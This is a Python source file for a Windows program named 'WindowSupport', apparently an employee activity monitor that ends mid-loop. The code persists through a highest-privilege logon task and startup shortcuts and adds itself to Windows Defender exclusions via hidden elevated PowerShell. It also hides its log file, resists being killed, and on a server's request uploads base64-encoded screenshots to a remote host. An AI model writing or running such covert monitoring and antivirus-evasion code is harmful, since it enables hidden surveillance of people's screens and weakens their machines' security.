import time
import os
import sys
import subprocess
import requests
import cloudscraper
import datetime
import socket
import json
import win32com.client  # Requires pywin32 library
from tkinter import Tk, Label, Button
from threading import Thread
import win32api
import win32con
import ctypes
import base64
import certifi
import getpass
import win32security
import ntsecuritycon as con
import ctypes.wintypes
import io
from PIL import Image
import tempfile
import numpy as np
import cv2
from PIL import ImageGrab
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor
import traceback
import ctypes
import builtins
import random
import threading

def get_appdata_dir():
    """Return per-user app data directory for this app and ensure it exists."""
    try:
        base_dir = os.environ.get('LOCALAPPDATA') or os.path.expanduser('~')
        app_dir = os.path.join(base_dir, 'WindowSupport')
        ensure_directory_permissions(app_dir)
        return app_dir
    except Exception:
        # Fallback to temp directory if anything goes wrong
        return tempfile.gettempdir()

def hide_file(filepath):
    try:
        if os.path.exists(filepath):
            ctypes.windll.kernel32.SetFileAttributesW(str(filepath), 2)  # 2 = hidden
    except Exception as e:
        print(f"Failed to set hidden attribute: {e}")

APPDATA_DIR = get_appdata_dir()
ERROR_LOG_FILE = os.path.join(APPDATA_DIR, 'error_logs.txt')
CONFIG_FILE = os.path.join(APPDATA_DIR, 'config.json')
LOG_FILE = os.path.join(APPDATA_DIR, 'app.log')

def log_error_to_file(error_text):
    try:
        # Ensure directory exists before writing
        try:
            ensure_directory_permissions(os.path.dirname(ERROR_LOG_FILE))
        except Exception:
            pass
        with open(ERROR_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(error_text + '\n')
        hide_file(ERROR_LOG_FILE)
    except Exception as e:
        print(f"Failed to write to error log file: {e}")

class _TeeLogger:
    """Tee stdout/stderr to both console and a rotating log file."""
    _lock = threading_lock = None

    def __init__(self, stream, file_handle):
        import threading
        if _TeeLogger.threading_lock is None:
            _TeeLogger.threading_lock = threading.Lock()
        self.stream = stream
        self.file_handle = file_handle

    def write(self, data):
        try:
            if not data:
                return 0
            with _TeeLogger.threading_lock:
                self.stream.write(data)
                try:
                    self.file_handle.write(data)
                except Exception:
                    pass
        except Exception:
            pass
        return len(data)

    def flush(self):
        try:
            with _TeeLogger.threading_lock:
                try:
                    self.stream.flush()
                except Exception:
                    pass
                try:
                    self.file_handle.flush()
                except Exception:
                    pass
        except Exception:
            pass

def _rotate_log_if_needed(path, max_bytes=5*1024*1024, backups=3):
    try:
        if not os.path.exists(path):
            return
        size = os.path.getsize(path)
        if size < max_bytes:
            return
        # Rotate: app.log -> app.log.1, etc.
        for i in range(backups, 0, -1):
            src = f"{path}.{i}" if i > 1 else path
            dst = f"{path}.{i+1}"
            if os.path.exists(src):
                try:
                    if os.path.exists(dst):
                        os.remove(dst)
                except Exception:
                    pass
                try:
                    os.replace(src, dst)
                except Exception:
                    pass
    except Exception as e:
        print(f"Log rotation check failed: {e}")

def setup_continuous_logging():
    global log_file_handle
    try:
        try:
            ensure_directory_permissions(APPDATA_DIR)
        except Exception:
            pass
        _rotate_log_if_needed(LOG_FILE)
        log_file_handle = open(LOG_FILE, 'a', encoding='utf-8', buffering=1)
        # Write a header for session start
        ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_file_handle.write(f"\n==== Session start {ts} PID={os.getpid()} ====" + "\n")
        # Tee stdout and stderr
        sys.stdout = _TeeLogger(sys.stdout, log_file_handle)
        sys.stderr = _TeeLogger(sys.stderr, log_file_handle)
    except Exception as e:
        try:
            print(f"Failed to set up continuous logging: {e}")
        except Exception:
            pass

def setup_pretty_print():
    """Wrap built-in print to include timestamp and big spacing between logs."""
    try:
        original_print = builtins.print

        def pretty_print(*args, **kwargs):
            try:
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                message = " ".join(str(a) for a in args)
                # Big spacing before each log entry and a clean, consistent prefix
                original_print("\n\n=== [" + timestamp + "] ===", flush=True)
                original_print(message, **kwargs)
            except Exception:
                # Fallback to normal print if formatting fails
                original_print(*args, **kwargs)

        builtins.print = pretty_print
    except Exception:
        pass

# Global variables
lockCount = 1
idleOrNot = None
last_sent_timestamp = None  # In-memory only
last_image_hash = None  # To store hash of last sent image
session = None  # Global session object
executor = ThreadPoolExecutor(max_workers=1)  # Single worker for sequential requests
HEARTBEAT_TS = None  # Watchdog heartbeat
_LAST_SELF_RESTART_TS = 0
log_file_handle = None  # Global log file handle for proper cleanup

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.wintypes.UINT), ("dwTime", ctypes.wintypes.DWORD)]

def is_system_locked_or_idle(idle_time_threshold=60):
    """
    Check if the system has been idle for at least the specified threshold.

    :param idle_time_threshold: Time in seconds to consider the system as idle.
    :return: True if the system is idle for at least the threshold, False otherwise.
    """
    last_input_info = LASTINPUTINFO()
    last_input_info.cbSize = ctypes.sizeof(LASTINPUTINFO)

    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input_info)):
        # Use GetTickCount() (32-bit) to match dwTime (32-bit DWORD)
        tick_count = ctypes.windll.kernel32.GetTickCount()
        
        # Handle wraparound by treating as unsigned 32-bit integers
        if tick_count >= last_input_info.dwTime:
            idle_time = (tick_count - last_input_info.dwTime) / 1000.0
        else:
            # Wraparound case: treat as unsigned difference
            idle_time = ((0xFFFFFFFF - last_input_info.dwTime) + tick_count + 1) / 1000.0
            
        print(f"idle_time: {idle_time}")
        print(f"idle_time_threshold: {idle_time_threshold}")
        return idle_time >= idle_time_threshold

    return False

def keep_system_awake_start():
    """Prevent the system from sleeping while work is in progress."""
    try:
        ES_CONTINUOUS = 0x80000000
        ES_SYSTEM_REQUIRED = 0x00000001
        ES_AWAYMODE_REQUIRED = 0x00000040
        ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED)
    except Exception as e:
        print(f"Failed to set execution state (start): {e}")

def keep_system_awake_stop():
    """Clear the request to prevent sleep."""
    try:
        ES_CONTINUOUS = 0x80000000
        ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)
    except Exception as e:
        print(f"Failed to set execution state (stop): {e}")

def ensure_directory_permissions(directory):
    """Ensure the directory has the correct permissions"""
    try:
        if not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        
        # Get current user
        user, domain, _ = win32security.LookupAccountName("", getpass.getuser())
        
        # Get security descriptor of the directory
        sd = win32security.GetFileSecurity(directory, win32security.DACL_SECURITY_INFORMATION)
        dacl = sd.GetSecurityDescriptorDacl()
        if dacl is None:
            dacl = win32security.ACL()
        
        # Add full control for the current user
        dacl.AddAccessAllowedAceEx(
            win32security.ACL_REVISION,
            win32security.CONTAINER_INHERIT_ACE | win32security.OBJECT_INHERIT_ACE,
            con.FILE_ALL_ACCESS,
            user
        )
        
        sd.SetSecurityDescriptorDacl(1, dacl, 0)
        win32security.SetFileSecurity(directory, win32security.DACL_SECURITY_INFORMATION, sd)
        
    except Exception as e:
        print(f"Warning: Could not set directory permissions: {e}")
        # Continue execution even if permission setting fails

def create_session():
    """Create a persistent session with retries and connection pooling"""
    global session
    if session is None:
        try:
            session = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'mobile': False
                }
            )
            
            # Configure retries
            retry_strategy = Retry(
                total=5,
                backoff_factor=1.5,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
                raise_on_status=False
            )
            
            # Configure connection pooling
            adapter = HTTPAdapter(
                pool_connections=10,
                pool_maxsize=10,
                max_retries=retry_strategy,
                pool_block=False
            )
            
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            print("New session created successfully")
            return session
        except Exception as e:
            print(f"Failed to create session: {e}")
            session = None
            return None
    return session

def reset_session():
    """Properly reset session on errors"""
    global session
    try:
        if session:
            print("Resetting session...")
            session.close()
    except Exception as e:
        print(f"Error closing session during reset: {e}")
    finally:
        session = None

def safe_sleep(seconds, jitter_ratio=0.2):
    try:
        jitter = seconds * jitter_ratio
        duration = max(0.5, seconds + random.uniform(-jitter, jitter))
        time.sleep(duration)
    except Exception:
        try:
            time.sleep(seconds)
        except Exception:
            pass

def update_heartbeat():
    global HEARTBEAT_TS
    try:
        HEARTBEAT_TS = datetime.datetime.now()
    except Exception:
        pass

def health_check():
    """Check if the application is healthy"""
    try:
        # Check if we can still access registry
        try:
            get_stored_staff_id()
        except Exception as e:
            print(f"Health check: Failed to read staff ID: {e}")
            return False
        
        # Check memory usage only (removed external URL test)
        try:
            import psutil
            process = psutil.Process()
            memory_mb = process.memory_info().rss / 1024 / 1024
            if memory_mb > 500:  # If using more than 500MB
                print(f"High memory usage detected: {memory_mb:.1f}MB")
                return False
        except Exception:
            pass  # psutil not available, skip memory check
        
        return True
    except Exception as e:
        print(f"Health check failed: {e}")
        return False

def check_network_connectivity():
    """Check if network is available"""
    try:
        import socket
        # Try to resolve DNS
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except Exception:
        try:
            # Try to resolve the target domain
            socket.create_connection(("teamspace.baselinepracticesupport.co.uk", 80), timeout=3)
            return True
        except Exception:
            return False

def cleanup_resources():
    """Clean up all resources before exit or restart"""
    global session, executor, log_file_handle
    try:
        print("Cleaning up resources...")
        
        # Close session
        if session:
            try:
                session.close()
            except Exception as e:
                print(f"Error closing session: {e}")
            finally:
                session = None
        
        # Shutdown executor
        if executor:
            try:
                executor.shutdown(wait=False)
            except Exception as e:
                print(f"Error shutting down executor: {e}")
            finally:
                executor = None
        
        # Close log file handle
        if log_file_handle:
            try:
                log_file_handle.flush()
                log_file_handle.close()
            except Exception as e:
                print(f"Error closing log file: {e}")
            finally:
                log_file_handle = None
        
        # Stop keeping system awake
        try:
            keep_system_awake_stop()
        except Exception as e:
            print(f"Error stopping system awake: {e}")
        
        # Flush all file handles
        try:
            sys.stdout.flush()
            sys.stderr.flush()
        except Exception:
            pass
            
        print("Resource cleanup completed")
    except Exception as e:
        print(f"Error during cleanup: {e}")

def restart_self_if_needed(reason="watchdog"): 
    global _LAST_SELF_RESTART_TS
    try:
        now_ts = time.time()
        if now_ts - _LAST_SELF_RESTART_TS < 60:
            print(f"Skip restart (cooldown). Reason: {reason}")
            return
        
        _LAST_SELF_RESTART_TS = now_ts
        print(f"Restarting process due to: {reason}")
        
        # Clean up resources before restart
        cleanup_resources()
        
        exe_path = os.path.abspath(sys.executable)
        # Flush logs
        try:
            sys.stdout.flush()
            sys.stderr.flush()
        except Exception:
            pass
        
        # Use os.execv to replace current process and relaunch the same script with args
        # Passing the script and its arguments prevents dropping into an interactive REPL
        try:
            os.execv(exe_path, [exe_path] + sys.argv)
        except Exception:
            # Fallback: try without argv[0] duplication if needed
            os.execv(exe_path, [exe_path] + sys.argv[1:])
        # This line should never be reached due to os.execv
        return
    except Exception as e:
        print(f"Failed to restart self: {e}")
        # If restart fails, try to exit gracefully
        try:
            cleanup_resources()
        except Exception:
            pass
        sys.exit(1)

def watchdog_loop(stall_seconds=300):
    """Enhanced watchdog with better error handling and recovery"""
    consecutive_watchdog_errors = 0
    max_watchdog_errors = 3
    
    while True:
        try:
            now = datetime.datetime.now()
            if HEARTBEAT_TS is not None:
                delta = (now - HEARTBEAT_TS).total_seconds()
                if delta > stall_seconds:
                    print(f"Watchdog detected stall: {delta:.0f}s without heartbeat")
                    restart_self_if_needed("stall")
            
            # Reset error counter on successful iteration
            consecutive_watchdog_errors = 0
            safe_sleep(30)
            
        except Exception as e:
            consecutive_watchdog_errors += 1
            print(f"Watchdog error (attempt {consecutive_watchdog_errors}): {e}")
            
            if consecutive_watchdog_errors >= max_watchdog_errors:
                print("Watchdog has too many errors, restarting...")
                restart_self_if_needed("watchdog_failure")
            
            # Exponential backoff for watchdog errors
            sleep_time = min(30 * consecutive_watchdog_errors, 120)
            safe_sleep(sleep_time)

def calculate_image_hash(image_bytes):
    """Calculate a simple hash of the image to detect changes"""
    return hash(image_bytes)

def take_screenshot():
    """Take a screenshot using OpenCV and return it as bytes with optimized quality and size"""
    screen = None
    pil_image = None
    img_byte_arr = None
    
    try:
        print("Taking screenshot...")
        # Enable DPI awareness for clear text
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
        except:
            pass
            
        # Capture the screen
        screen = np.array(ImageGrab.grab())
        
        # Convert from BGR to RGB
        screen = cv2.cvtColor(screen, cv2.COLOR_BGR2RGB)
        
        # Resize image to optimize for readability and file size
        height, width = screen.shape[:2]
        target_dimension = 1280  # Good balance between readability and size
        if width > target_dimension or height > target_dimension:
            scale = target_dimension / max(width, height)
            new_width = int(width * scale)
            new_height = int(height * scale)
            screen = cv2.resize(screen, (new_width, new_height), 
                              interpolation=cv2.INTER_AREA)  # Better for downscaling
        
        # Optimize image for text readability
        # Subtle sharpening for text clarity
        kernel = np.array([[0,-1,0],
                         [-1,5,-1],
                         [0,-1,0]]) / 1.0
        screen = cv2.filter2D(screen, -1, kernel)
        
        # Convert to PIL Image for compression
        pil_image = Image.fromarray(screen)
        
        # Enhance readability without excessive processing
        from PIL import ImageEnhance
        enhancer = ImageEnhance.Sharpness(pil_image)
        pil_image = enhancer.enhance(1.2)
        
        # Use BytesIO for in-memory operations
        img_byte_arr = io.BytesIO()
        
        # Save with optimized settings for balance between quality and size
        pil_image.save(img_byte_arr, 
                      format='JPEG', 
                      quality=80,  # Good balance between quality and size
                      optimize=True,  # Enable compression optimization
                      subsampling='4:2:0')  # Standard subsampling for better compression
        
        bytes_data = img_byte_arr.getvalue()
        file_size_kb = len(bytes_data) / 1024
        print(f"Screenshot captured successfully. Size: {file_size_kb:.1f} KB")
        return bytes_data
        
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None
    finally:
        # Explicit cleanup of large objects to prevent memory leaks
        try:
            if screen is not None:
                del screen
            if pil_image is not None:
                del pil_image
            if img_byte_arr is not None:
                del img_byte_arr
            # Force garbage collection
            import gc
            gc.collect()
        except Exception:
            pass

def get_stored_staff_id():
    """Read the staff ID from the Windows Registry (fallback to file if needed)"""
    try:
        import winreg
        REG_PATH = r"Software\\WindowSupport"
        REG_NAME = "staff_id"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            value, _ = winreg.QueryValueEx(key, REG_NAME)
            winreg.CloseKey(key)
            return value
        except FileNotFoundError:
            # Fallback to config file in per-user appdata
            try:
                if os.path.exists(CONFIG_FILE):
                    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and data.get('staff_id'):
                            return data['staff_id']
                raise Exception("Staff ID not found. Please run get_your_staff_id.py or create config.json with staff_id in %LOCALAPPDATA%\\WindowSupport.")
            except Exception as ex:
                raise Exception(str(ex))
        except Exception as e:
            print(f"Error reading staff ID from registry: {e}")
            raise Exception("Could not read staff ID from registry.")
    except Exception as e:
        print(f"Error in get_stored_staff_id: {e}")
        raise

def send_status_update():
    global idleOrNot, response_text, last_image_hash, session, last_sent_timestamp
    try:
        current_timestamp = datetime.datetime.now()
        
        # Check network connectivity first
        if not check_network_connectivity():
            print("No network connectivity, skipping API request")
            return
        
        # Use HTTPS for security
        url = "https://teamspace.baselinepracticesupport.co.uk/employee_online.php"
        max_retries = 3
        for attempt in range(max_retries):
            try:
                staff_id = get_stored_staff_id()
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    print(f"Failed to get staff ID after {max_retries} attempts: {e}")
                    return
                print(f"Attempt {attempt + 1} failed to get staff ID, retrying...")
                safe_sleep(2)
        for attempt in range(max_retries):
            try:
                scraper = create_session()
                if scraper is None:
                    raise Exception("Session creation returned None")
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    print(f"Failed to create session after {max_retries} attempts: {e}")
                    return
                reset_session()
                safe_sleep(2)
        data = {
            'staff_identifi_code': staff_id,
            'date': current_timestamp.strftime("%Y-%m-%d %H:%M:%S")
        }
        print("\n=== Initial Request ===")
        print("Sending initial request to API...")
        try:
            keep_system_awake_start()
            future = executor.submit(lambda: scraper.post(url, json=data, verify=certifi.where()))
            response = future.result(timeout=30)
            print(f"Response Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error in initial request: {e}")
            reset_session()
            return
        finally:
            keep_system_awake_stop()
        response_text = response.text.lower()
        if "send image" in response_text:
            print("\n=== Image Request ===")
            print("Server requested image. Taking and sending screenshot...")
            # Skip screenshot if session is idle/locked/non-interactive
            try:
                if is_system_locked_or_idle(idle_time_threshold=1):
                    print("Session is idle/locked. Skipping screenshot.")
                    return
            except Exception as e:
                print(f"Could not determine session state: {e}")
            screenshot_bytes = None
            for attempt in range(max_retries):
                try:
                    screenshot_bytes = take_screenshot()
                    if screenshot_bytes:
                        break
                except Exception as e:
                    print(f"Screenshot attempt {attempt + 1} failed: {e}")
                    if attempt < max_retries - 1:
                        safe_sleep(2)
            if screenshot_bytes:
                current_hash = calculate_image_hash(screenshot_bytes)
                if current_hash == last_image_hash:
                    print("Image unchanged since last send, skipping...")
                    return
                last_image_hash = current_hash
                data['image'] = base64.b64encode(screenshot_bytes).decode('utf-8')
                try:
                    keep_system_awake_start()
                    future = executor.submit(lambda: scraper.post(url, json=data, verify=certifi.where()))
                    response = future.result(timeout=60)
                    print("Image sent successfully")
                    print(f"Response Status Code: {response.status_code}")
                    print(f"Response Content: {response.text}")
                except Exception as e:
                    print(f"Error sending image: {e}")
                    reset_session()
                    return
                finally:
                    keep_system_awake_stop()
        try:
            text = response.text
            json_start = text.find('{')
            json_end = text.find('}', json_start) + 1
            if json_start >= 0 and json_end > json_start:
                json_text = text[json_start:json_end]
                response_json = json.loads(json_text)
                if "success" in response_json:
                    print("Success response received")
                    idleOrNot = response_json.get("idle") == "true"
                elif "error" in response_json:
                    print("Error response received:", response_json["error"])
                    idleOrNot = None
                else:
                    idleOrNot = None
            else:
                print("No valid JSON found in response")
                idleOrNot = None
        except json.JSONDecodeError as e:
            print(f"Failed to parse JSON response: {e}")
            idleOrNot = None
        except Exception as e:
            print(f"Error processing response: {e}")
            idleOrNot = None
        if response.status_code == 200:
            last_sent_timestamp = current_timestamp
    except Exception as e:
        print(f"Unexpected error in send_status_update: {e}")
        reset_session()
        return

def add_windows_defender_exclusion():
    """Add self and app directory to Windows Defender exclusions"""
    try:
        exe_path = os.path.abspath(sys.executable)
        app_dir = APPDATA_DIR
        exe_name = os.path.basename(exe_path)
        
        print("Adding Windows Defender exclusions (requires admin)...")
        # PowerShell commands to add exclusions (path + process name)
        commands = [
            f'Add-MpPreference -ExclusionPath "{exe_path}"',
            f'Add-MpPreference -ExclusionPath "{app_dir}"',
            f'Add-MpPreference -ExclusionProcess "{exe_name}"',
        ]
        
        for cmd in commands:
            try:
                # Try to run with admin elevation
                result = subprocess.run(
                    f'powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList \'-NoProfile\',\'-Command\',\'{cmd}\' -WindowStyle Hidden -Wait"',
                    shell=True,
                    capture_output=True,
                    timeout=15,
                    text=True
                )
                print(f"✓ Exclusion added successfully")
            except Exception as e:
                print(f"⚠ Could not add exclusion (needs admin or user declined): {e}")
        
        # Create a helper batch file for manual execution
        try:
            batch_path = os.path.join(app_dir, 'add_exclusions.bat')
            with open(batch_path, 'w') as f:
                f.write('@echo off\n')
                f.write('echo Adding Windows Defender Exclusions...\n')
                f.write('echo This requires Administrator privileges.\n')
                f.write('echo.\n')
                for cmd in commands:
                    f.write(f'powershell -Command "{cmd}"\n')
                f.write('echo.\n')
                f.write('echo Done! Press any key to exit...\n')
                f.write('pause >nul\n')
            print(f"✓ Helper script created: {batch_path}")
            print("  Run this batch file as Admin to add exclusions manually")
        except Exception as e:
            print(f"Could not create helper batch file: {e}")
            
    except Exception as e:
        print(f"Exclusion setup failed: {e}")

def add_to_startup():
    """Install as scheduled task with auto-restart capability (service-like behavior)"""
    # Get the path to the current .exe file
    exe_path = os.path.abspath(sys.executable)
    task_name = "WindowSupportMonitor"
    
    # IMPORTANT: Only add to startup if running from proper installation location
    # Don't register if running from build/dist folder
    expected_location = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'WindowSupport')
    current_location = os.path.dirname(exe_path)
    
    print(f"=== Startup Registration Check ===")
    print(f"Current exe location: {current_location}")
    print(f"Expected install location: {expected_location}")
    
    # Normalize paths for comparison (handle different separators, case)
    expected_normalized = os.path.normpath(expected_location).lower()
    current_normalized = os.path.normpath(current_location).lower()
    
    print(f"Normalized expected: {expected_normalized}")
    print(f"Normalized current: {current_normalized}")
    
    # Check if we're in the correct installation directory
    # Allow subdirectories of WindowSupport (like WindowPowerShellProvider subfolder)
    if not current_normalized.startswith(expected_normalized):
        print("⚠ WARNING: Not running from installed location!")
        print("⚠ Skipping startup registration to avoid registering wrong path.")
        print(f"⚠ This exe should be run from: {expected_location}")
        print(f"⚠ Currently running from: {current_location}")
        print("⚠ Please use INSTALL_WindowSupport.bat to install properly.")
        print("=" * 50)
        return
    
    # Get current user with domain
    try:
        import getpass
        current_user = getpass.getuser()
        # Try to get domain\username format
        try:
            import win32api
            domain = win32api.GetDomainName()
            full_user = f"{domain}\\{current_user}"
        except:
            # Fallback to just username
            full_user = current_user
    except:
        full_user = os.environ.get('USERNAME', os.environ.get('USER', 'SYSTEM'))
    
    print(f"✓ Running from correct installation location")
    print(f"Setting up startup for user: {full_user}")
    print(f"Executable path: {exe_path}")
    
    try:
        # First, try the simpler /CREATE method without XML
        # Check if task already exists
        result = subprocess.run(
            f'schtasks /query /tn "{task_name}"',
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print("Task already exists. Deleting old task...")
            delete_result = subprocess.run(
                f'schtasks /delete /tn "{task_name}" /f',
                shell=True,
                capture_output=True,
                text=True
            )
            print(f"Delete result: {delete_result.returncode}")
            if delete_result.stderr:
                print(f"Delete stderr: {delete_result.stderr}")
        
        # Create the scheduled task using simple command
        print("Creating scheduled task...")
        create_cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc onlogon /rl highest /f'
        print(f"Command: {create_cmd}")
        
        result = subprocess.run(
            create_cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        print(f"Create task return code: {result.returncode}")
        print(f"Create task stdout: {result.stdout}")
        if result.stderr:
            print(f"Create task stderr: {result.stderr}")
        
        if result.returncode == 0:
            print("✓ Scheduled task created successfully!")
            print("  - Starts at user login")
            print("  - Runs with highest privileges")
            
            # Verify the task was created
            verify_result = subprocess.run(
                f'schtasks /query /tn "{task_name}"',
                shell=True,
                capture_output=True,
                text=True
            )
            if verify_result.returncode == 0:
                print("✓ Task verified successfully!")
            else:
                print("⚠ Warning: Could not verify task creation")
        else:
            print(f"⚠ Failed to create scheduled task!")
            print(f"   Error: {result.stderr}")
            print(f"   Trying alternative method...")
            
            # Try alternative method with startup folder
            try:
                startup_folder = os.path.join(
                    os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
                )
                shortcut_path = os.path.join(startup_folder, "WindowSupport.lnk")
                
                # Create shortcut using VBScript
                vbs_script = f'''
                    Set oWS = WScript.CreateObject("WScript.Shell")
                    sLinkFile = "{shortcut_path}"
                    Set oLink = oWS.CreateShortcut(sLinkFile)
                    oLink.TargetPath = "{exe_path}"
                    oLink.WorkingDirectory = "{os.path.dirname(exe_path)}"
                    oLink.WindowStyle = 7
                    oLink.Save
                '''
                vbs_path = os.path.join(tempfile.gettempdir(), 'create_shortcut.vbs')
                with open(vbs_path, 'w') as f:
                    f.write(vbs_script)
                
                subprocess.run(['cscript', '//nologo', vbs_path], 
                             shell=True, capture_output=True)
                
                try:
                    os.remove(vbs_path)
                except:
                    pass
                
                if os.path.exists(shortcut_path):
                    print(f"✓ Created startup shortcut as fallback: {shortcut_path}")
                else:
                    print("⚠ Failed to create startup shortcut")
            except Exception as e:
                print(f"⚠ Startup folder method also failed: {e}")
            
    except Exception as e:
        print(f"Exception in add_to_startup: {e}")
        import traceback
        traceback.print_exc()
    
    # Add to Windows Startup folder as well (in addition to scheduled task)
    try:
        print("\nAdding to Windows Startup folder...")
        startup_folder = os.path.join(
            os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        shortcut_path = os.path.join(startup_folder, "WindowSupport.lnk")
        
        print(f"Startup folder: {startup_folder}")
        print(f"Creating shortcut: {shortcut_path}")
        
        # Create shortcut using COM
        try:
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.WindowStyle = 7  # Minimized
            shortcut.Description = "WindowSupport - Activity Monitor"
            shortcut.save()
            print("✓ Startup folder shortcut created successfully!")
            print(f"  Location: {shortcut_path}")
        except Exception as e:
            print(f"Could not create shortcut via COM: {e}")
            print("Trying alternative method with VBScript...")
            
            # Fallback: Create using VBScript
            vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{exe_path}"
oLink.WorkingDirectory = "{os.path.dirname(exe_path)}"
oLink.WindowStyle = 7
oLink.Description = "WindowSupport - Activity Monitor"
oLink.Save
'''
            vbs_path = os.path.join(tempfile.gettempdir(), 'create_startup_shortcut.vbs')
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            
            result = subprocess.run(['cscript', '//nologo', vbs_path], 
                                  shell=True, capture_output=True, text=True)
            
            try:
                os.remove(vbs_path)
            except:
                pass
            
            if os.path.exists(shortcut_path):
                print("✓ Startup folder shortcut created via VBScript!")
                print(f"  Location: {shortcut_path}")
            else:
                print(f"⚠ Failed to create startup shortcut")
                print(f"  You can manually create a shortcut to: {exe_path}")
                print(f"  And place it in: {startup_folder}")
        
        # Remove old shortcuts if they exist
        old_shortcuts = ["send_status_update.lnk", "WindowPowerShellProvider.lnk"]
        for old_name in old_shortcuts:
            old_path = os.path.join(startup_folder, old_name)
            if old_path != shortcut_path and os.path.exists(old_path):
                try:
                    os.remove(old_path)
                    print(f"Removed old shortcut: {old_name}")
                except:
                    pass
                    
    except Exception as e:
        print(f"Note: Could not manage startup folder shortcut: {e}")

def lock_screen():
    # Call Windows API to lock the workstation
    ctypes.windll.user32.LockWorkStation()

def main():
    global response_text
    response_text = ""
    consecutive_errors = 0
    max_consecutive_errors = 5
    health_check_interval = 10  # Check health every 10 iterations
    
    try:
        print('main')
        
        # Set high process priority for better performance and harder to kill
        try:
            import psutil
            p = psutil.Process()
            p.nice(psutil.HIGH_PRIORITY_CLASS)
            print("✓ Process priority set to HIGH")
        except Exception as e:
            print(f"Could not set high priority: {e}")
        
        # Initialize continuous logging early so subsequent prints are captured
        try:
            setup_continuous_logging()
        except Exception as e:
            print(f"Continuous logging setup error: {e}")
        try:
            setup_pretty_print()
        except Exception as e:
            print(f"Pretty print setup error: {e}")
        
        # Start watchdog thread (daemon)
        try:
            wd = threading.Thread(target=watchdog_loop, name="watchdog", daemon=True)
            wd.start()
        except Exception as e:
            print(f"Failed to start watchdog: {e}")
        
        # Add to startup (scheduled task with auto-restart)
        add_to_startup()
        
        # Add Windows Defender exclusions (will prompt for admin)
        try:
            add_windows_defender_exclusion()
        except Exception as e:
            print(f"Could not add defender exclusions: {e}")
            
    except Exception as e:
        print(f"Error in startup registration: {e}")
    
    iteration_count = 0
    while True:
        try:
            global lockCount
            iteration_count += 1
            
            try:
                update_heartbeat()
                
                # Health check every N iterations
                if iteration_count % health_check_interval == 0:
                    if not health_check():
                        print("Health check failed, resetting session...")
                        global session
                        if session:
                            try:
                                session.close()
                            except Exception:
                                pass
                            session = None
                        consecutive_errors += 1
                        if consecutive_errors >= max_consecutive_errors:
                            print("Too many consecutive errors, restarting...")
                            restart_self_if_needed("health_check_failure")
                        safe_sleep(30)
                        continue
                    else:
                        consecutive_errors = 0  # Reset on successful health check
                
                if is_system_locked_or_idle(idle_time_threshold=120):
                    print("System is idle. Skipping API request.")
                    lockCount = lockCount if lockCount == 5 else lockCount + 1
                    if lockCount == 5 and idleOrNot != False:
                        try:
                            lock_screen()
                        except Exception as e:
                            print(f"Error locking screen: {e}")
                        lockCount = 1
                else:
                    lockCount = 1
                    send_status_update()
                
                if idleOrNot is not None and response_text and "send image" in response_text.lower():
                    safe_sleep(10)
                else:
                    safe_sleep(60)
                    
            except Exception as e:
                consecutive_errors += 1
                print(f"Error in main loop inner try (attempt {consecutive_errors}): {e}")
                
                if consecutive_errors >= max_consecutive_errors:
                    print("Too many consecutive errors, restarting...")
                    restart_self_if_needed("consecutive_errors")
                
                # Exponential backoff
                sleep_time = min(60 * consecutive_errors, 300)
                safe_sleep(sleep_time)
                
        except Exception as e:
            print(f"Error in main loop outer try: {e}")
            safe_sleep(60)

if __name__ == "__main__":
    import datetime
    # Global exception hooks
    def _global_excepthook(exc_type, exc_value, exc_traceback):
        try:
            tb = ''.join(traceback.format_exception(exc_type, exc_value, exc_traceback))
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            error_text = f"[{timestamp}] Unhandled exception: {exc_value}\n{tb}"
            print(error_text)
            log_error_to_file(error_text)
        except Exception:
            pass
    sys.excepthook = _global_excepthook

    try:
        def _thread_excepthook(args):
            try:
                tb = ''.join(traceback.format_exception(args.exc_type, args.exc_value, args.exc_traceback))
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                error_text = f"[{timestamp}] Thread exception in {args.thread.name}: {args.exc_value}\n{tb}"
                print(error_text)
                log_error_to_file(error_text)
            except Exception:
                pass
        threading.excepthook = _thread_excepthook  # Python 3.8+
    except Exception:
        pass
    # Ultimate protection: if main() crashes, restart it after delay
    restart_count = 0
    while True:
